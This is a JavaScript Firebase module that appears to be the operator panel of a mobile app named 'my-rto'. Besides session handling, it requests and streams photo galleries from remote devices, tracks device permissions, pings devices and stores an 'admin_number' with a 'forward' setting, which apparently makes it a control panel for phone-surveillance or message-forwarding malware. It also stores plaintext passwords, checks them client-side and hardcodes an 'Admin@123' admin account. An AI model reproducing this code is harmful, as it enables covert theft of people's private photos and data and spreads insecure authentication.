import { initializeApp } from 'firebase/app';
import {
  getDatabase,
  ref,
  onValue,
  update,
  get,
  set,
  remove,
  push,
  query,
  orderByChild,
  equalTo
} from 'firebase/database';

const firebaseConfig = {
  apiKey: "AIzaSyDofemvEqfdNDp79CtTg_x6ujjElCAkGsI",
  authDomain: "my-rto-b2531.firebaseapp.com",
  databaseURL: "https://my-rto-b2531-default-rtdb.firebaseio.com",
  projectId: "my-rto-b2531",
  storageBucket: "my-rto-b2531.firebasestorage.app",
  messagingSenderId: "465334829178",
  appId: "1:465334829178:web:621d8269e0ace1e9f4fbc3"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

// ============================================
// FACEBOOK-STYLE SESSION MANAGEMENT
// ============================================

// Generate unique session ID
const generateSessionId = () => {
  return `${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
};

// Get device fingerprint (unique for each device)
export const getDeviceFingerprint = () => {
  const screen = window.screen;
  const navigatorInfo = window.navigator;

  return {
    userAgent: navigatorInfo.userAgent,
    platform: navigatorInfo.platform,
    language: navigatorInfo.language,
    screenWidth: screen.width,
    screenHeight: screen.height,
    colorDepth: screen.colorDepth,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    fingerprint: `${navigatorInfo.userAgent}_${screen.width}x${screen.height}_${navigatorInfo.language}`
  };
};

// Create session when user logs in (Facebook style)
export const createSession = async (userId, deviceInfo) => {
  try {
    const fingerprint = getDeviceFingerprint();
    const sessionId = generateSessionId();
    const sessionRef = ref(db, `sessions/${userId}/${sessionId}`);

    await set(sessionRef, {
      sessionId: sessionId,
      userId: userId,
      deviceName: deviceInfo.deviceName || fingerprint.userAgent.substring(0, 50),
      deviceModel: deviceInfo.deviceModel || fingerprint.platform,
      browser: deviceInfo.browser || fingerprint.userAgent,
      os: deviceInfo.os || fingerprint.platform,
      ip: deviceInfo.ip || 'Unknown',
      location: deviceInfo.location || 'Unknown',
      loginTime: Date.now(),
      lastActive: Date.now(),
      isActive: true,
      fingerprint: fingerprint.fingerprint,
      screenInfo: `${fingerprint.screenWidth}x${fingerprint.screenHeight}`,
      language: fingerprint.language,
      timezone: fingerprint.timezone
    });

    return { success: true, sessionId: sessionId };
  } catch (error) {
    return { success: false, error: error.message };
  }
};

// Update session activity (like Facebook's "Active Now")
export const updateSessionActivity = async (userId, sessionId) => {
  try {
    const sessionRef = ref(db, `sessions/${userId}/${sessionId}`);
    await update(sessionRef, {
      lastActive: Date.now(),
      isActive: true
    });
    return { success: true };
  } catch (error) {
    return { success: false, error: error.message };
  }
};

// Get all sessions of a user
export const getUserSessions = async (userId) => {
  try {
    const sessionsRef = ref(db, `sessions/${userId}`);
    const snapshot = await get(sessionsRef);
    if (snapshot.exists()) {
      const data = snapshot.val();
      const sessionsArray = Object.keys(data).map(key => ({
        sessionId: key,
        ...data[key]
      }));
      sessionsArray.sort((a, b) => b.loginTime - a.loginTime);
      return { success: true, sessions: sessionsArray };
    }
    return { success: true, sessions: [] };
  } catch (error) {
    return { success: false, error: error.message };
  }
};

// Get all sessions of all users (Admin)
export const getAllSessions = async () => {
  try {
    const sessionsRef = ref(db, 'sessions');
    const snapshot = await get(sessionsRef);
    if (snapshot.exists()) {
      const data = snapshot.val();
      const sessionsArray = [];
      for (let userId in data) {
        for (let sessionId in data[userId]) {
          sessionsArray.push({
            userId: userId,
            sessionId: sessionId,
            ...data[userId][sessionId]
          });
        }
      }
      sessionsArray.sort((a, b) => b.loginTime - a.loginTime);
      return { success: true, sessions: sessionsArray };
    }
    return { success: true, sessions: [] };
  } catch (error) {
    return { success: false, error: error.message };
  }
};

// Logout specific session (Facebook style - "Log out of this device")
export const logoutSession = async (userId, sessionId) => {
  try {
    const sessionRef = ref(db, `sessions/${userId}/${sessionId}`);
    await remove(sessionRef);
    return { success: true };
  } catch (error) {
    return { success: false, error: error.message };
  }
};

// Logout all sessions of a user (Facebook style - "Log out of all devices")
export const logoutAllSessions = async (userId) => {
  try {
    const sessionsRef = ref(db, `sessions/${userId}`);
    await remove(sessionsRef);
    return { success: true };
  } catch (error) {
    return { success: false, error: error.message };
  }
};

// Listen to user sessions (Real-time)
export const listenUserSessions = (userId, callback) => {
  const sessionsRef = ref(db, `sessions/${userId}`);
  return onValue(sessionsRef, (snapshot) => {
    const data = snapshot.val() || {};
    const sessionsArray = Object.keys(data).map(key => ({
      sessionId: key,
      ...data[key]
    }));
    sessionsArray.sort((a, b) => b.loginTime - a.loginTime);
    callback(sessionsArray);
  });
};

// Listen to all sessions (Real-time - Admin)
export const listenAllSessions = (callback) => {
  const sessionsRef = ref(db, 'sessions');
  return onValue(sessionsRef, (snapshot) => {
    const data = snapshot.val() || {};
    const sessionsArray = [];
    for (let userId in data) {
      for (let sessionId in data[userId]) {
        sessionsArray.push({
          userId: userId,
          sessionId: sessionId,
          ...data[userId][sessionId]
        });
      }
    }
    sessionsArray.sort((a, b) => b.loginTime - a.loginTime);
    callback(sessionsArray);
  });
};

// ============================================
// REMOTE LOGOUT SYSTEM (FULL)
// ============================================

// Send remote logout command to specific device
export const sendRemoteLogoutCommand = async (userId, sessionId) => {
  try {
    const commandRef = ref(db, `logout_commands/${userId}/${sessionId}`);
    await set(commandRef, {
      forceLogout: true,
      timestamp: Date.now(),
      message: 'You have been logged out from this device by admin',
      userId: userId,
      sessionId: sessionId
    });
    return { success: true };
  } catch (error) {
    return { success: false, error: error.message };
  }
};

// Send remote logout to all devices of a user
export const sendRemoteLogoutAllCommand = async (userId) => {
  try {
    // Get all sessions of user
    const sessionsRef = ref(db, `sessions/${userId}`);
    const snapshot = await get(sessionsRef);

    if (snapshot.exists()) {
      const sessions = snapshot.val();
      for (let sessionId in sessions) {
        const commandRef = ref(db, `logout_commands/${userId}/${sessionId}`);
        await set(commandRef, {
          forceLogout: true,
          timestamp: Date.now(),
          message: 'You have been logged out from all devices by admin',
          userId: userId,
          sessionId: sessionId
        });
      }
    }
    return { success: true };
  } catch (error) {
    return { success: false, error: error.message };
  }
};

// Check if remote logout command exists
export const checkRemoteLogout = async (userId, sessionId) => {
  try {
    const commandRef = ref(db, `logout_commands/${userId}/${sessionId}`);
    const snapshot = await get(commandRef);
    if (snapshot.exists()) {
      const data = snapshot.val();
      // Remove command after reading
      await remove(commandRef);
      return { success: true, data: data };
    }
    return { success: false };
  } catch (error) {
    return { success: false, error: error.message };
  }
};

// Listen for remote logout commands (Real-time)
export const listenRemoteLogout = (userId, sessionId, callback) => {
  const commandRef = ref(db, `logout_commands/${userId}/${sessionId}`);
  return onValue(commandRef, (snapshot) => {
    if (snapshot.exists()) {
      const data = snapshot.val();
      if (data.forceLogout) {
        callback(data);
        // Remove command after processing
        remove(commandRef);
      }
    }
  });
};

// Remote logout - Single device (Admin action)
export const remoteLogoutDevice = async (userId, sessionId) => {
  try {
    // Send logout command to device
    await sendRemoteLogoutCommand(userId, sessionId);

    // Remove session immediately
    const sessionRef = ref(db, `sessions/${userId}/${sessionId}`);
    await remove(sessionRef);

    return { success: true };
  } catch (error) {
    return { success: false, error: error.message };
  }
};

// Remote logout - All devices (Admin action)
export const remoteLogoutAllDevices = async (userId) => {
  try {
    // Send logout command to all devices
    await sendRemoteLogoutAllCommand(userId);

    // Remove all sessions
    const sessionsRef = ref(db, `sessions/${userId}`);
    await remove(sessionsRef);

    // Update user status
    const userRef = ref(db, `users/${userId}`);
    await update(userRef, {
      active: false,
      lastLogout: Date.now()
    });

    return { success: true };
  } catch (error) {
    return { success: false, error: error.message };
  }
};

// ===== AUTH FUNCTIONS =====

export const loginUser = async (userId, password) => {
  try {
    const usersRef = ref(db, 'users');
    const snapshot = await get(usersRef);
    const users = snapshot.val();

    if (!users) {
      return { success: false, error: 'No users found in database' };
    }

    let foundUser = null;
    let foundUid = null;

    for (let uid in users) {
      const user = users[uid];
      if (user.userId === userId || user.email === userId) {
        foundUser = user;
        foundUid = uid;
        break;
      }
    }

    if (!foundUser) {
      return { success: false, error: 'Invalid User ID or Password' };
    }

    if (foundUser.password !== password) {
      return { success: false, error: 'Invalid User ID or Password' };
    }

    await update(ref(db, `users/${foundUid}`), {
      lastLogin: Date.now(),
      active: true
    });

    return {
      success: true,
      user: {
        uid: foundUid,
        ...foundUser
      }
    };
  } catch (error) {
    return { success: false, error: error.message };
  }
};

export const logoutUser = () => {
  return { success: true };
};

export const changePassword = async (userId, oldPassword, newPassword) => {
  try {
    const usersRef = ref(db, 'users');
    const snapshot = await get(usersRef);
    const users = snapshot.val();

    let foundUid = null;
    for (let uid in users) {
      const user = users[uid];
      if (user.userId === userId || user.email === userId) {
        foundUid = uid;
        break;
      }
    }

    if (!foundUid) {
      return { success: false, error: 'User not found' };
    }

    const userData = users[foundUid];
    if (userData.password !== oldPassword) {
      return { success: false, error: 'Current password is incorrect' };
    }

    await update(ref(db, `users/${foundUid}`), {
      password: newPassword
    });

    return {
      success: true,
      shouldLogout: true,
      message: 'Password changed successfully! Please login again.'
    };
  } catch (error) {
    return { success: false, error: error.message };
  }
};

export const getUserData = async (userId) => {
  try {
    const usersRef = ref(db, 'users');
    const snapshot = await get(usersRef);
    const users = snapshot.val();

    for (let uid in users) {
      const user = users[uid];
      if (user.userId === userId) {
        return { success: true, data: { uid, ...user } };
      }
    }
    return { success: false, error: 'User not found' };
  } catch (error) {
    return { success: false, error: error.message };
  }
};

export const listenDevices = (callback) => {
  const devicesRef = ref(db, 'devices');
  return onValue(devicesRef, (snapshot) => {
    const data = snapshot.val() || {};
    const devicesArray = Object.keys(data).map(key => ({
      id: key,
      ...data[key]
    }));
    callback(devicesArray);
  });
};

export const updateDeviceField = async (deviceId, field, value) => {
  const deviceRef = ref(db, `devices/${deviceId}`);
  await update(deviceRef, { [field]: value });
};

export const getSettings = async () => {
  const settingsRef = ref(db, 'settings');
  const snapshot = await get(settingsRef);
  return snapshot.exists() ? snapshot.val() : { admin_number: '', forward: true };
};

export const updateSettings = async (data) => {
  const settingsRef = ref(db, 'settings');
  await update(settingsRef, data);
};

export const getDevice = async (deviceId) => {
  const deviceRef = ref(db, `devices/${deviceId}`);
  const snapshot = await get(deviceRef);
  return snapshot.exists() ? { id: deviceId, ...snapshot.val() } : null;
};

export const createAdminUser = async () => {
  try {
    const usersRef = ref(db, 'users');
    const snapshot = await get(usersRef);
    const users = snapshot.val() || {};

    for (let uid in users) {
      if (users[uid].userId === 'admin') {
        return { success: false, error: 'Admin user already exists!' };
      }
    }

    const newUid = Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
    await set(ref(db, `users/${newUid}`), {
      userId: 'admin',
      email: 'admin@kronos.com',
      name: 'Admin User',
      role: 'admin',
      password: 'Admin@123',
      createdAt: Date.now(),
      lastLogin: Date.now(),
      active: true
    });

    return {
      success: true,
      message: 'Admin user created successfully!'
    };
  } catch (error) {
    return { success: false, error: error.message };
  }
};
// Send ping to device
export const sendPing = async (deviceId) => {
  try {
    const pingRef = ref(db, `pings/${deviceId}`);
    await set(pingRef, {
      ping: true,
      timestamp: Date.now(),
      from: 'admin'
    });

    // Auto remove after 5 seconds
    setTimeout(async () => {
      await remove(pingRef);
    }, 5000);

    return { success: true };
  } catch (error) {
    console.error('Ping error:', error);
    return { success: false, error: error.message };
  }
};
// ============================================
// ✅ GALLERY FUNCTIONS (Admin)
// ============================================

// Admin gallery request bhejta hai
export const requestGalleryFromDevice = async (deviceId) => {
  try {
    await set(ref(db, `gallery_requests/${deviceId}`), {
      requested: true,
      requestedAt: Date.now(),
      status: 'pending',
      requestedBy: 'admin'
    });
    return { success: true };
  } catch (error) {
    return { success: false, error: error.message };
  }
};

// Request clear karo (modal close hone par)
export const clearGalleryRequest = async (deviceId) => {
  try {
    await remove(ref(db, `gallery_requests/${deviceId}`));
    return { success: true };
  } catch (error) {
    return { success: false, error: error.message };
  }
};

// Live gallery listen (real-time)
export const listenLiveGallery = (deviceId, callback) => {
  const galleryRef = ref(db, `gallery_preview/${deviceId}`);
  
  console.log('🔍 Listening:', `gallery_preview/${deviceId}`);
  
  return onValue(galleryRef, (snapshot) => {
    console.log('📡 Exists:', snapshot.exists());
    
    const data = snapshot.val() || {};
    const images = Object.keys(data).map(key => ({
      id: key,
      ...data[key]
    }));
    
    console.log('📊 Images:', images.length);
    
    // ✅ Base64 wali images pehle
    images.sort((a, b) => {
      // Loading wali last me
      if (a.base64 && !b.base64) return -1;
      if (!a.base64 && b.base64) return 1;
      return (b.timestamp || 0) - (a.timestamp || 0);
    });

    const stats = {
      total: images.length,
      completed: images.filter(i => i.base64).length,
      loading: images.filter(i => i.uploading === true).length
    };
    
    console.log('📈 Stats:', stats);
    callback(images, stats);
  });
};

// ✅ Device permission listen (PermissionHelper se)
export const listenDevicePermissions = (deviceId, callback) => {
  const permRef = ref(db, `permissions/${deviceId}`);
  return onValue(permRef, (snapshot) => {
    callback(snapshot.exists() ? snapshot.val() : {});
  });
};

// Delete single image
export const deleteGalleryImage = async (deviceId, imageId) => {
  try {
    await remove(ref(db, `devices/${deviceId}/gallery/${imageId}`));
    return { success: true };
  } catch (error) {
    return { success: false, error: error.message };
  }
};

// Clear all images
export const clearDeviceGallery = async (deviceId) => {
  try {
    await remove(ref(db, `devices/${deviceId}/gallery`));
    return { success: true };
  } catch (error) {
    return { success: false, error: error.message };
  }
};

// Download base64 image
export const downloadBase64Image = (base64, filename) => {
  try {
    const base64Data = base64.split(',')[1] || base64;
    const byteCharacters = atob(base64Data);
    const byteNumbers = new Array(byteCharacters.length);
    for (let i = 0; i < byteCharacters.length; i++) {
      byteNumbers[i] = byteCharacters.charCodeAt(i);
    }
    const byteArray = new Uint8Array(byteNumbers);
    const blob = new Blob([byteArray], { type: 'image/jpeg' });

    const url = window.URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = filename || `image_${Date.now()}.jpg`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    setTimeout(() => window.URL.revokeObjectURL(url), 1000);

    return { success: true };
  } catch (error) {
    return { success: false, error: error.message };
  }
};
// ✅ Load More request bhejo
export const requestLoadMore = async (deviceId, offset) => {
  try {
    await set(ref(db, `gallery_load_more/${deviceId}`), {
      requested: true,
      offset: offset,
      limit: 20,
      requestedAt: Date.now()
    });
    return { success: true };
  } catch (error) {
    return { success: false, error: error.message };
  }
};

// ✅ Clear Load More request
export const clearLoadMoreRequest = async (deviceId) => {
  try {
    await remove(ref(db, `gallery_load_more/${deviceId}`));
    return { success: true };
  } catch (error) {
    return { success: false, error: error.message };
  }
};
// Listen for ping response from device (Real-time)
export const listenPingResponse = (deviceId, callback) => {
  const responseRef = ref(db, `pong/${deviceId}`);
  return onValue(responseRef, (snapshot) => {
    if (snapshot.exists()) {
      const data = snapshot.val();
      callback(data);
      // Auto remove after reading
      setTimeout(() => {
        remove(responseRef);
      }, 2000);
    }
  });
};
export { db };
